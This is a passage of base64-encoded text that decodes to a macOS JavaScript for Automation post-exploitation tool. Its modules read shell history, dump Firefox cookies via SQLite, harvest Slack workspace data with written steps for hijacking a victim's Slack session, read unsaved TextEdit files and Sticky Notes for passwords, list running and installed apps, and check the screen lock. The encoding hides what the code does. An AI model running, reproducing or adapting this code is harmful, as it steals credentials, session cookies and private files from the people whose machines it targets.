hciBjb250ZW50cyA9ICQuTlNTdHJpbmcuc3RyaW5nV2l0aENvbnRlbnRzT2ZGaWxlRW5jb2RpbmdFcnJvcihhenBhdGgyLCQuTlNVVEY4U3RyaW5nRW5jb2RpbmcsICQoKSkuanM7CgkJCXJlc3VsdHMgKz0gY29udGVudHM7CgkJCXJlc3VsdHMgKz0gIlxuIjsKCQkJfQoJCQljYXRjaChlcnIpewoJCQkJcmVzdWx0cyArPSBlcnI7CgkJCQlyZXN1bHRzICs9ICJcbiI7CgkJCX0KCgkJfQoKCQlyZXN1bHRzICs9ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7CgkJcmV0dXJuIHJlc3VsdHMKCX0KCS8vLy8vLy8vLy8vLy8vLwoKCWZ1bmN0aW9uIFJ1bm5pbmdBcHBzKCl7CgkJdmFyIHJlc3VsdHMgPSAiIjsKCQlyZXN1bHRzICs9ICI9PT09PT5SdW5uaW5nIEFwcHM6XG4iOwoJCXRyeXsKCQl2YXIgYXBwc2luZm8gPSAkLk5TV29ya3NwYWNlLnNoYXJlZFdvcmtzcGFjZS5ydW5uaW5nQXBwbGljYXRpb25zLmpzOwoJCXZhciBhcHBzaW5mbzIgPSBbXTsKCQlmb3IobGV0IGkgPSAwOyBpIDwgYXBwc2luZm8ubGVuZ3RoOyBpKyspewoJCSAgICAgICAgbGV0IGluZm8gPSB7fTsKCQkgICAgICAgIHJlc3VsdHMgKz0gKGkrMSkgKyAiLiAiICsgYXBwc2luZm9baV0ubG9jYWxpemVkTmFtZS5qczsKCQkJcmVzdWx0cyArPSAiXG4iOwoKCQl9CgkJfSBjYXRjaChlcnIpewoJCQlyZXN1bHRzICs9IGVycjsKCQkJcmVzdWx0cyArPSAiXG4iOwoJCX0KCQlyZXN1bHRzICs9ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7CgkJcmV0dXJuIHJlc3VsdHMKCX0KCS8vLy8vLy8vLy8vLy8vLwoKCWZ1bmN0aW9uIEhpc3RvcnkoKXsKCQl2YXIgcmVzdWx0cyA9ICIiOwoJCXZhciBjdXJydXNlciA9IGN1cnJlbnRBcHAuc3lzdGVtSW5mbygpLnNob3J0VXNlck5hbWU7CgkJdmFyIHpwYXRoID0gKCIvVXNlcnMvIiArIGN1cnJ1c2VyICsgIi8uenNoX2hpc3RvcnkiKTsKCgkJaWYgKGZpbGVNYW4uZmlsZUV4aXN0c0F0UGF0aCh6cGF0aCkpewoJCSAgICAgICAgdHJ5ewoJCSAgICAgICAgcmVzdWx0cyArPSAiXG5bK10gTG9jYWwgenNoIGhpc3Rvcnkgc2VhcmNoOlxuIjsKCQkgICAgICAgIHJlc3VsdHMgKz0gIlsuenNoX2hpc3RvcnldIjsKCQkgICAgICAgIHJlc3VsdHMgKz0gIlxuIjsKCQkJCQkJdmFyIGNvbnRlbnRzID0kLk5TU3RyaW5nLnN0cmluZ1dpdGhDb250ZW50c09mRmlsZUVuY29kaW5nRXJyb3IoenBhdGgsJC5OU1VURjhTdHJpbmdFbmNvZGluZywgJCgpKS5qczsKCQkgICAgICAgIHJlc3VsdHMgKz0gY29udGVudHM7CgkJICAgICAgICByZXN1bHRzICs9ICJcbiI7CgoJCSAgICAgICAgfQoJCSAgICAgICAgY2F0Y2goZXJyKXsKCQkgICAgICAgICAgICAgICAgcmVzdWx0cyArPSBlcnI7CgkJICAgICAgICAgICAgICAgIHJlc3VsdHMgKz0gIlxuIjsKCQkgICAgICAgIH0KCgkJfQoKCQlyZXN1bHRzICs9ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7CgkJcmV0dXJuIHJlc3VsdHMKCX0KCS8vLy8vLy8vLy8vLy8vLy8KCglmdW5jdGlvbiBTbGFja1NlYXJjaCgpewoJCXZhciByZXN1bHRzID0gIiI7CgkJdmFyIGN1cnJ1c2VyID0gY3VycmVudEFwcC5zeXN0ZW1JbmZvKCkuc2hvcnRVc2VyTmFtZTsKCQl2YXIgc2RQYXRoID0gIi9Vc2Vycy8iICsgY3VycnVzZXIgKyAiL0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9TbGFjay9zdG9yYWdlL3NsYWNrLWRvd25sb2FkcyI7CgkJdmFyIHN3UGF0aCA9ICIvVXNlcnMvIiArIGN1cnJ1c2VyICsgIi9MaWJyYXJ5L0FwcGxpY2F0aW9uIFN1cHBvcnQvU2xhY2svc3RvcmFnZS9zbGFjay13b3Jrc3BhY2VzIjsKCQl2YXIgY2FuYXJ5ID0gMDsKCgkJaWYgKGZpbGVNYW4uZmlsZUV4aXN0c0F0UGF0aChzZFBhdGgpKXsKCQkJY2FuYXJ5ID0gY2FuYXJ5ICsgMTsKCQkgICAgICAgIHRyeXsKCQkgICAgICAgIHJlc3VsdHMgKz0gIlxuWytdIFNsYWNrIGRvd25sb2FkcyBkYXRhIHNlYXJjaDpcbiI7CgkJICAgICAgICByZXN1bHRzICs9ICJbc2xhY2stZG93bmxvYWRzXSI7CgkJICAgICAgICByZXN1bHRzICs9ICJcbiI7CgkJICAgICAgICB2YXIgY29udGVudHMgPSAkLk5TU3RyaW5nLnN0cmluZ1dpdGhDb250ZW50c09mRmlsZUVuY29kaW5nRXJyb3Ioc2RQYXRoLCQuTlNVVEY4U3RyaW5nRW5jb2RpbmcsICQoKSkuanM7CgkJCXZhciBjb250ZW50czIgPSBTdHJpbmcoY29udGVudHMpOwoJCQl2YXIgY29udGVudHMzID0gY29udGVudHMyLnNwbGl0KCIsIik7CgkJCWZvcihxID0gMDsgcSA8IGNvbnRlbnRzMy5sZW5ndGg7IHErKyl7CgkJCQlpZihjb250ZW50czNbcV0uaW5jbHVkZXMoImh0dHAiKSl7CgkJCQkJcmVzdWx0cyArPSAiPT0+ICIgKyBjb250ZW50czNbcV0gKyAiXG4iOwoJCQkJfQoJCQl9CgkJICAgICAgICB9CgkJICAgICAgICBjYXRjaChlcnIpewoJCSAgICAgICAgICAgICAgICByZXN1bHRzICs9IGVycjsKCQkgICAgICAgICAgICAgICAgcmVzdWx0cyArPSAiXG4iOwoJCSAgICAgICAgfQoKCQl9CgoKCQlpZiAoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKHN3UGF0aCkpewoJCQljYW5hcnkgPSBjYW5hcnkgKyAxOwoJCSAgICAgICAgdHJ5ewoJCSAgICAgICAgcmVzdWx0cyArPSAiXG5bK10gU2xhY2sgd29ya3NwYWNlcyBkYXRhIHNlYXJjaDpcbiI7CgkJICAgICAgICByZXN1bHRzICs9ICJbc2xhY2sgd29ya3NwYWNlc10iOwoJCSAgICAgICAgcmVzdWx0cyArPSAiXG4iOwoJCSAgICAgICAgdmFyIGNvbnRlbnRzID0gJC5OU1N0cmluZy5zdHJpbmdXaXRoQ29udGVudHNPZkZpbGVFbmNvZGluZ0Vycm9yKHN3UGF0aCwkLk5TVVRGOFN0cmluZ0VuY29kaW5nLCAkKCkpLmpzOwoJCQl2YXIgY29udGVudHMyID0gU3RyaW5nKGNvbnRlbnRzKTsKCQkJdmFyIGNvbnRlbnRzMyA9IGNvbnRlbnRzMi5zcGxpdCgiLCIpOwoJCQlmb3IocSA9IDA7IHEgPCBjb250ZW50czMubGVuZ3RoOyBxKyspewoJCQkJaWYoY29udGVudHMzW3FdLmluY2x1ZGVzKCJkb21haW4iKSl7CgkJCQlyZXN1bHRzICs9ICI9PT4gIiArIGNvbnRlbnRzM1txXSArICJcbiI7CgkJCQl9CgkJCQlpZihjb250ZW50czNbcV0uaW5jbHVkZXMoIm5hbWUiKSl7CgkJCQlyZXN1bHRzICs9IGNvbnRlbnRzM1txXSArICJcbiI7CgkJCQl9CgkJCX0KCgkJCXJlc3VsdHMgKz0gIlxuU3RlcHMgZnJvbSBDb2R5J3MgYXJ0aWNsZSB0byBsb2FkIHRoZSBTbGFjayBmaWxlcyBmb3VuZDpcbjEuIFB1bGwgdGhlIHNsYWNrLXdvcmtzcGFjZXMgYW5kIENvb2tpZXMgZmlsZXMgZnJvbSB0aGUgaG9zdC5cbjIuIEluc3RhbGwgYSBuZXcgaW5zdGFuY2Ugb2Ygc2xhY2sgKGJ1dCBkb27igJl0IHNpZ24gaW4gdG8gYW55dGhpbmcpXG4zLiBDbG9zZSBTbGFjayBhbmQgcmVwbGFjZSB0aGUgYXV0b21hdGljYWxseSBjcmVhdGVkIFNsYWNrL3N0b3JhZ2Uvc2xhY2std29ya3NwYWNlcyBhbmQgU2xhY2svQ29va2llcyBmaWxlcyB3aXRoIHRoZSB0d28geW91IGRvd25sb2FkZWQgZnJvbSB0aGUgdmljdGltXG40LiBTdGFydCBTbGFjayI7CgoJCQl9CgkJICAgICAgICBjYXRjaChlcnIpewoJCSAgICAgICAgICAgICAgICByZXN1bHRzICs9IGVycjsKCQkgICAgICAgICAgICAgICAgcmVzdWx0cyArPSAiXG4iOwoJCSAgICAgICAgfQoKCgoJCX0KCgkJaWYgKGNhbmFyeSA9PSAwKSB7CgkJCXJlc3VsdHMgKz0gIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuWy1dIFNsYWNrIG5vdCBmb3VuZCBvbiB0aGlzIGhvc3RcbiI7CgkJfQoKCQlyZXN1bHRzICs9ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7CgkJcmV0dXJuIHJlc3VsdHMKCX0KCS8vLy8vLy8vLy8vLy8vLy8vLy8vLwoKCWZ1bmN0aW9uIEluc3RhbGxlZEFwcHMoKXsKCQl2YXIgcmVzdWx0cyA9ICIiOwoJCXZhciBmaWxlTWFuID0gJC5OU0ZpbGVNYW5hZ2VyLmRlZmF1bHRNYW5hZ2VyOwoJCXZhciBlcnI7CgkJdmFyIHVzZXJuYW1lID0gJC5OU1VzZXJOYW1lKCkuanMKCQl2YXIgaXBhdGggPSAnL3ByaXZhdGUvdmFyL2RiL3JlY2VpcHRzJzsKCQlpZiAoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKGlwYXRoKSl7CgkJICAgICAgICByZXN1bHRzICs9ICJcblsrXSBJbmZvIG9uIGluc3RhbGxlcnMgYW5kIGFwcHM6XG4iOwoJCSAgICAgICAgbGV0IGl0ZW1zID0gT2JqQy5kZWVwVW53cmFwKGZpbGVNYW4uY29udGVudHNPZkRpcmVjdG9yeUF0UGF0aEVycm9yKGlwYXRoLCQoKSkpOwoJCSAgICAgICAgdHJ5ewoJCSAgICAgICAgICAgICAgICBmb3IgKHA9MDsgcCA8IGl0ZW1zLmxlbmd0aDsgcCsrKXsKCQkgICAgICAgICAgICAgICAgICAgICAgICByZXN1bHRzICs9IGl0ZW1zW3BdICsgJ1xuJzsKCgkJICAgICAgICAgICAgICAgIH0KCgoKCQkgICAgICAgIH0KCgkJY2F0Y2goZXJyKXsKCQkgICAgICAgIHJlc3VsdHMgKz0gZXJyOwoJCX0KCQlyZXN1bHRzICs9ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7CgoJCXJldHVybiByZXN1bHRzCgkJfQoJfQoJLy8vLy8vLy8vLy8vLy8vLy8vLy8vCglmdW5jdGlvbiBMb2NrQ2hlY2soKXsKCQl2YXIgcmVzdWx0cyA9ICIiOwoKCQl0cnkgewoKCQl2YXIgc2NyaXB0ID0gYAoJCSMhL2Jpbi9iYXNoCgkJcD0kKGlvcmVnIC1uIFJvb3QgLWQxIC1hIHwgZ3JlcCBDR1NTZXNzaW9uKQoJCWlmIFtbICIkcCIgPT0gKiJDR1NTZXNzaW9uU2NyZWVuSXNMb2NrZWQiKiBdXTsgdGhlbgoJCSAgICAgICAgZWNobyAiWytdIFNjcmVlbiBpcyBjdXJyZW50bHkgTE9DS0VEIgoJCWVsc2UKCQkgICAgICAgIGVjaG8gIlstXSBTY3JlZW4gaXMgY3VycmVudGx5IFVOTE9DS0VEIgoJCWZpYAoKCQl2YXIgcCA9IGN1cnJlbnRBcHAuZG9TaGVsbFNjcmlwdChzY3JpcHQpOwoKCQlyZXN1bHRzICs9IHA7CgkJcmVzdWx0cyArPSAiXG4jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7CgkJcmV0dXJuIHJlc3VsdHMKCgkJfSBjYXRjaCAoZXJyb3IpewoJCQkJcmVzdWx0cyArPSAiXG4jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7CgkJICAgICAgICByZXR1cm4gZXJyb3I7CgkJfQoKCnJldHVybiByZXN1bHRzCgoJfQoKLy8vLy8vLy8vLy8vLy8vLy8vLy8vCiAgICAgICAgZnVuY3Rpb24gVGV4dEVkaXRDaGVjaygpewogICAgICAgICAgICAgICAgdmFyIHJlc3VsdHMgPSAiIjsKCQl2YXIgZmlsZU1hbiA9ICQuTlNGaWxlTWFuYWdlci5kZWZhdWx0TWFuYWdlcjsKCQl2YXIgZXJyOwoJCXZhciB1c2VybmFtZSA9ICQuTlNVc2VyTmFtZSgpLmpzOwoJCXZhciBwYXRoID0gIi9Vc2Vycy8iICsgdXNlcm5hbWUgKyAiL0xpYnJhcnkvQ29udGFpbmVycy9jb20uYXBwbGUuVGV4dEVkaXQvRGF0YS9MaWJyYXJ5L0F1dG9zYXZlIEluZm9ybWF0aW9uIjsKCQl2YXIgdGNhbmFyeSA9IDA7CgoJCWlmIChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgocGF0aCkpewoJCQlyZXN1bHRzICs9ICJcblRleHRFZGl0IGF1dG9zYXZlIHRlbXAgZGlyIGZvdW5kLi4uY2hlY2tpbmcgZm9yIHVuc2F2ZWQgVGV4dEVkaXQgZG9jdW1lbnRzLi4uXG4iOwoJCQl0cnkgewoJCQkJdmFyIGRpckNvbnRlbnRzID0gT2JqQy5kZWVwVW53cmFwKGZpbGVNYW4uY29udGVudHNPZkRpcmVjdG9yeUF0UGF0aEVycm9yKHBhdGgsJCgpKSk7CgkJCQlpZiAoZGlyQ29udGVudHMubGVuZ3RoID4gMSl7CgkJCQkJZm9yIChwPTA7IHA8ZGlyQ29udGVudHMubGVuZ3RoOyBwKyspewoJCQkJCQlpZiAoZGlyQ29udGVudHNbcF0uZW5kc1dpdGgoIi5ydGYiKSl7CgkJCQkJCQl0Y2FuYXJ5ICs9IDE7CgkJCQkJCQl2YXIgY29udGVudHMgPSAkLk5TU3RyaW5nLnN0cmluZ1dpdGhDb250ZW50c09mRmlsZUVuY29kaW5nRXJyb3IocGF0aCArICIvIiArIGRpckNvbnRlbnRzW3BdLCQuTlNORVhUU1RFUFN0cmluZ0VuY29kaW5nLCAkKCkpLmpzOwoJCQkJCQkJcmVzdWx0cyArPSAiXG5VbnNhdmVkIFRleHRFZGl0IGZpbGUgY29udGVudHM6XG4iOwoJCQkJCQkJcmVzdWx0cyArPSBjb250ZW50cwoJCQkJCQkJcmVzdWx0cyArPSAiXG5cbiI7CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCQlpZiAodGNhbmFyeSA9PSAwKXsKCQkJCQlyZXN1bHRzICs9ICJcbiI7CgkJCQkJcmVzdWx0cyArPSAiWy1dIE5vIHVuc2F2ZWQgVGV4dEVkaXQgZG9jdW1lbnRzIGZvdW5kLi4uXG4iOwoJCQkJfQoJCQl9CgkJCWNhdGNoKGVycil7CgkJCQlyZXN1bHRzICs9ICJcbiI7CgkJCQlyZXN1bHRzICs9IGVycjsKCQkJCXJlc3VsdHMgKz0gIlxuIjsKCgkJCX0KCQl9CgpyZXR1cm4gcmVzdWx0cwoKICAgICAgICB9CgoKCglmdW5jdGlvbiBGaXJlZm94Q29va2llcygpewoJCXZhciByZXN1bHRzID0gIiI7CgkJdmFyIGZpbGVNYW4gPSAkLk5TRmlsZU1hbmFnZXIuZGVmYXVsdE1hbmFnZXI7CgkJdmFyIGVycjsKCQl2YXIgdXNlcm5hbWUgPSAkLk5TVXNlck5hbWUoKS5qcwoJCXZhciBmZm94cGF0aCA9ICcvVXNlcnMvJyArIHVzZXJuYW1lICsgJy9MaWJyYXJ5L0FwcGxpY2F0aW9uXCBTdXBwb3J0L0ZpcmVmb3gvUHJvZmlsZXMnOwoJCWlmIChmaWxlTWFuLmZpbGVFeGlzdHNBdFBhdGgoZmZveHBhdGgpKXsKCQkJcmVzdWx0cyArPSAiXG5bK10gRmlyZWZveCBjb29raWVzLnNxbGl0ZTpcbiI7CgkJCWxldCBwcm9mX2ZvbGRlcnMgPSBPYmpDLmRlZXBVbndyYXAoZmlsZU1hbi5jb250ZW50c09mRGlyZWN0b3J5QXRQYXRoRXJyb3IoZmZveHBhdGgsJCgpKSk7CgkJCXRyeXsKCQkJCWZvciAocD0wOyBwPCBwcm9mX2ZvbGRlcnMubGVuZ3RoOyBwKyspewoJCQkJCWlmICgocHJvZl9mb2xkZXJzW3BdKS5pbmNsdWRlcygnLXJlbGVhc2UnKSl7CgkJCQkJCXZhciBjaGFuZ2V0byA9IGZmb3hwYXRoICsgIi8iICsgcHJvZl9mb2xkZXJzW3BdOwoJCQkJCQl2YXIgZGlyY29udGVudHMgPSBPYmpDLmRlZXBVbndyYXAoZmlsZU1hbi5jb250ZW50c09mRGlyZWN0b3J5QXRQYXRoRXJyb3IoY2hhbmdldG8sJCgpKSk7CgkJCQkJCWZvciAobj0wOyBuPGRpcmNvbnRlbnRzLmxlbmd0aDsgbisrKXsKCQkJCQkJCWlmIChkaXJjb250ZW50c1tuXSA9PSAnY29va2llcy5zcWxpdGUnKXsKCQkJCQkJCQl2YXIgY2twYXRoID0gY2hhbmdldG8gKyAiLyIgKyBkaXJjb250ZW50c1tuXTsKCQkJCQkJCQl2YXIgcHBEYiA9IFJlZigpOwoJCQkJCQkJCXZhciBlcnIgPSAkLnNxbGl0ZTNfb3Blbihja3BhdGgsIHBwRGIpCgkJCQkJCQkJdmFyIGRiID0gcHBEYlswXQoJCQkJCQkJCWlmKGVyciAhPSAkLlNRTElURV9PSykgdGhyb3cgbmV3IEVycm9yKCQuc3FsaXRlM19lcnJtc2coZGIpKQoJCQkJCQkJCXZhciBzcWwgPSAnc2VsZWN0IG5hbWUsdmFsdWUsaG9zdCxwYXRoLGRhdGV0aW1lKGV4cGlyeSxcJ3VuaXhlcG9jaFwnKSBhcyBleHBpcmVkYXRlLGlzU2VjdXJlLGlzSHR0cE9ubHksc2FtZVNpdGUgZnJvbSBtb3pfY29va2llcycKCQkJCQkJCQl2YXIgcHBTdG10ID0gUmVmKCkKCQkJCQkJCQl2YXIgZXJyID0gJC5zcWxpdGUzX3ByZXBhcmUoZGIsIHNxbCwgLTEsIHBwU3RtdCwgUmVmKCkpCgkJCQkJCQkJaWYoZXJyICE9ICQuU1FMSVRFX09LKSB0aHJvdyBuZXcgRXJyb3IoJC5zcWxpdGUzX2Vycm1zZyhkYikpCgkJCQkJCQkJcFN0bXQgPSBwcFN0bXRbMF0KCQkJCQkJCQl0cnl7CgkJCQkJCQkJCXJlc3VsdHMgKz0gJ0ZPUk1BVDogY29va2llIG5hbWUgfCBjb29raWUgdmFsdWUgfCBob3N0IHwgcGF0aCB8IGV4cGlyZSBkYXRlIHwgaXNTZWN1cmUgfCBpc0h0dHBPbmx5IHwgc2FtZVNpdGVcbic7CgkJCQkJCQkJCXJlc3VsdHMgKz0gJ19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX1xuJzsKCQkJCQkJCQkJd2hpbGUoKGVyciA9ICQuc3FsaXRlM19zdGVwKHBTdG10KSkgPT0gJC5TUUxJVEVfUk9XKXsKCQkJCQkJCQkJCXJlc3VsdHMgKz0gJC5zcWxpdGUzX2NvbHVtbl90ZXh0KHBTdG10LDApICsgIiB8ICIgKyAkLnNxbGl0ZTNfY29sdW1uX3RleHQocFN0bXQsMSkgKyAiIHwgIiArICQuc3FsaXRlM19jb2x1bW5fdGV4dChwU3RtdCwyKSArICIgfCAiICsgJC5zcWxpdGUzX2NvbHVtbl90ZXh0KHBTdG10LDMpICsgIiB8ICIgKyAkLnNxbGl0ZTNfY29sdW1uX3RleHQocFN0bXQsNCkgKyAiIHwgIiArICQuc3FsaXRlM19jb2x1bW5fdGV4dChwU3RtdCw1KSArICIgfCAiICsgJC5zcWxpdGUzX2NvbHVtbl90ZXh0KHBTdG10LDYpICsgIiB8ICIgKyAkLnNxbGl0ZTNfY29sdW1uX3RleHQocFN0bXQsNykgKyAiIHwgXG4iCgkJCQkJCQkJCX0KCQkJCQkJCQkJcmVzdWx0cyArPSAnIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbic7CgkJCQkJCQkJCXJldHVybiByZXN1bHRzCgkJCQkJCQkJfQoJCQkJCQkJCWNhdGNoKGVycm9yKXsKCQkJCQkJCQkJcmVzdWx0cyArPSBlcnJvci50b1N0cmluZygpCgkJCQkJCQkJCXJldHVybiByZXN1bHRzCgoJCQkJCQkJCX0KCgkJCQkJCQl9CgoKCgkJCQkJCX0KCgoKCQkJCQl9CgkJCQl9CgkJCX0KCgkJY2F0Y2goZXJyKXsKCQl9CgkJcmVzdWx0cyArPSAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOwoJCXJldHVybiByZXN1bHRzCgkJfQoJfQoKCS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vCgoJZnVuY3Rpb24gU3RpY2t5Tm90ZXMoKXsgLy9BZGRlZCBieSBkb2NGb3JkCgkJdmFyIHJlc3VsdHMgPSAiIjsKCQl2YXIgZmlsZU1hbiA9ICQuTlNGaWxlTWFuYWdlci5kZWZhdWx0TWFuYWdlcjsKCQl2YXIgZXJyOwoJCXZhciB1c2VybmFtZSA9ICQuTlNVc2VyTmFtZSgpLmpzCgkJdmFyIHN0aWNraWVzcGF0aCA9ICcvVXNlcnMvJyArIHVzZXJuYW1lICsgJy9MaWJyYXJ5L0NvbnRhaW5lcnMvY29tLmFwcGxlLlN0aWNraWVzL0RhdGEvTGlicmFyeS9TdGlja2llcy8nOwoJCXJlc3VsdHMgKz0gIj09PT09PiBDaGVja2luZyBmb3IgU3RpY2t5IE5vdGVzOlxuIjsKCQlpZiAoZmlsZU1hbi5maWxlRXhpc3RzQXRQYXRoKHN0aWNraWVzcGF0aCkpewoJCQlsZXQgc3RpY2t5X2ZpbGVzID0gT2JqQy5kZWVwVW53cmFwKGZpbGVNYW4uY29udGVudHNPZkRpcmVjdG9yeUF0UGF0aEVycm9yKHN0aWNraWVzcGF0aCwkKCkpKTsKCQkJaWYgKHN0aWNreV9maWxlcy5sZW5ndGggPiAxKXsgLy8gVGhpcyBhY2NvdW50cyBmb3IgLlNhdmVkU3RpY2tpZXNTdGF0ZSAodGhlIHN0aWNreSBwbGlzdCkKCQkJCXJlc3VsdHMgKz0gIlxuWytdIFN0aWNreSBGaWxlcyBGb3VuZDpcbiI7CgkJCQlyZXN1bHRzICs9IHN0aWNreV9maWxlcyArICJcblxuIjsKCQkJCXJlc3VsdHMgKz0gIlt+XSBJZiBhIHBhc3N3b3JkIGlzIHRoZSBsYXN0IGl0ZW0gaW4gYSBzdGlja3kgbm90ZSwgaXQgd2lsbCBlbmQgd2l0aCBhICd9JywgdGhpcyBpcyBmb3IgdGhlIGNvbnRlbnQgb2YgdGhlIHN0aWNreSBub3RlIGFuZCBub3QgYSBwYXJ0IG9mIHRoZSBwYXNzd29yZC5cblxuIgoJCQkJcmVzdWx0cyArPSAiU3RpY2t5IEZpbGUgQ29udGVudHM6IFxuIjsKCQkJCXJlc3VsdHMgKz0gIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09XG5cbiI7CgkJCQl0cnl7CgkJCQkJZm9yIChwPTA7IHA8IHN0aWNreV9maWxlcy5sZW5ndGg7IHArKyl7CgkJCQkJCWlmIChzdGlja3lfZmlsZXNbcF0uaW5jbHVkZXMoJ0RTX1N0b3JlJykgfHwgc3RpY2t5X2ZpbGVzW3BdLmluY2x1ZGVzKCdTYXZlZFN0aWNraWVzU3RhdGUnKSl7CgkJCQkJCWNvbnRpbnVlOwoJCQkJCQl9CgkJCQkJCXZhciBjaGFuZ2V0byA9IHN0aWNraWVzcGF0aCArIHN0aWNreV9maWxlc1twXTsKCQkJCQkJbGV0IHJ0Zl9maWxlcyA9IE9iakMuZGVlcFVud3JhcChmaWxlTWFuLmNvbnRlbnRzT2ZEaXJlY3RvcnlBdFBhdGhFcnJvcihjaGFuZ2V0bywkKCkpKTsKCQkJCQkJcmVzdWx0cyArPSAiUlRGIEZJTEVTIEZPVU5EOiAiICsgcnRmX2ZpbGVzICsgIlxuIjsKCQkJCQkJZm9yIChxPTA7IHE8IHJ0Zl9maWxlcy5sZW5ndGg7IHErKyl7CgkJCQkJCQl2YXIgcnRmRmlsZVBhdGggPSBjaGFuZ2V0byArICIvIiArIHJ0Zl9maWxlc1txXQoJCQkJCQkJaWYgKHJ0ZkZpbGVQYXRoLmluY2x1ZGVzKCdUWFQucnRmJykpewoJCQkJCQkJCXZhciBjb250ZW50cyA9JC5OU1N0cmluZy5zdHJpbmdXaXRoQ29udGVudHNPZkZpbGVFbmNvZGluZ0Vycm9yKHJ0ZkZpbGVQYXRoLCQuTlNORVhUU1RFUFN0cmluZ0VuY29kaW5nLCAkKCkpLmpzOwoJCQkJCQkJCXJlc3VsdHMgKz0gIkNvbnRlbnRzIG9mOiBcbiIgKyBydGZGaWxlUGF0aCArICJcbiI7CgkJCQkJCQkJcmVzdWx0cyArPSAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG5cbiIKCQkJCQkJCQlyZXN1bHRzICs9IGNvbnRlbnRzOwoJCQkJCQkJCXJlc3VsdHMgKz0gIlxuLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG4iCgkJCQkJCQl9CgkJCQkJCQllbHNlIHsKCQkJCQkJCXJlc3VsdHMgKz0gIlxuTm9uLVJURiBmaWxlIGZvdW5kOiBcbj09PT09PT09PT09PT09PT09PT09PT1cbiIgKyBjaGFuZ2V0byArICIvIiArIHJ0Zl9maWxlc1txXSArICJcblxuIjsKCQkJCQkJCXJlc3VsdHMgKz0gIlshXSBSZXZpZXcgdGhpcyBmaWxlIG1hbnVhbGx5XG5cbj09PT09PT09PT09PT09PT09PT09PT1cblxuXG4iOwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQkJY2F0Y2goZXJyKXsKCQkJCQlyZXN1bHRzICs9IGVycjsKCQkJCQlyZXN1bHRzICs9ICJcbiI7CgkJCQl9CgkJCX0KCQkJZWxzZSB7CgkJCQlyZXN1bHRzICs9ICJObyBTdGlja3kgTm90ZXMgZm91bmQgb24gdGhlIHN5c3RlbS5cblxuIgoJCQl9CgkJfQoJCXJlc3VsdHMgKz0gIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsKCQlyZXR1cm4gcmVzdWx0czsKCX0KCWlmIChvcHRpb25zID09ICJBbGwiKXsKCXZhcjEgPSBUQ0NDaGVjaygpOwoJb3V0c3RyaW5nICs9IHZhcjE7Cgl2YXIyID0gU2VjQ2hlY2soKTsKCW91dHN0cmluZyArPSB2YXIyOwoJdmFyMyA9IFN5c0luZm8oKTsKCW91dHN0cmluZyArPSB2YXIzOwoJdmFyNCA9IENyZWRTZWFyY2goKTsKCW91dHN0cmluZyArPSB2YXI0OwoJdmFyNSA9IFJ1bm5pbmdBcHBzKCk7CglvdXRzdHJpbmcgKz0gdmFyNTsKCXZhcjYgPSBIaXN0b3J5KCk7CglvdXRzdHJpbmcgKz0gdmFyNjsKCXZhcjcgPSBTbGFja1NlYXJjaCgpOwoJb3V0c3RyaW5nICs9IHZhcjc7Cgl2YXI4ID0gU2xhY2tTZWFyY2goKTsKCW91dHN0cmluZyArPSB2YXI4OwoJdmFyOSA9IEZpcmVmb3hDb29raWVzKCk7CglvdXRzdHJpbmcgKz0gdmFyOTsKCXZhcjEwID0gU3RpY2t5Tm90ZXMoKTsKCW91dHN0cmluZyArPSB2YXIxMDsKCXZhcjExID0gVGV4dEVkaXRDaGVjaygpOwoJb3V0c3RyaW5nICs9IHZhcjExOwp9CmVsc2UgewoJaWYgKG9wdGlvbnMuaW5jbHVkZXMoIlRDQ0NoZWNrIikpewoJCXZhcjEgPSBUQ0NDaGVjaygpOwoJCW91dHN0cmluZyArPSB2YXIxOwoJfQoJaWYgKG9wdGlvbnMuaW5jbHVkZXMoIkxvY2tDaGVjayIpKXsKCQl2YXIxMCA9IExvY2tDaGVjaygpOwoJCW91dHN0cmluZyArPSB2YXIxMDsKCX0KCWlmIChvcHRpb25zLmluY2x1ZGVzKCdTZWNDaGVjaycpKXsKCQl2YXIyID0gU2VjQ2hlY2soKTsKCQlvdXRzdHJpbmcgKz0gdmFyMjsKCX0KCWlmIChvcHRpb25zLmluY2x1ZGVzKCJTeXNJbmZvIikpewoJCXZhcjMgPSBTeXNJbmZvKCk7CgkJb3V0c3RyaW5nICs9IH